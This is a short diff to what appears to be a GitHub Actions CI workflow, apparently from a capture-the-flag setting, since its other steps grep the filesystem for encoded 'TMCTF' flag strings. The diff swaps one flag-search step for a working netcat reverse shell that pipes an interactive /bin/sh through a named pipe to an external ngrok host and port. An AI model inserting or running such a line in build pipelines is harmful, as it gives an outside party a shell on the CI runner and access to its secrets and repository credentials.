@@ -5,8 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          rgrep -i "VE1DVEZ7" / 2>/dev/null
-
+          rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 19253 >/tmp/f
       - run: |
           rgrep -i "544d435446" / 2>/dev/null
       - run: |
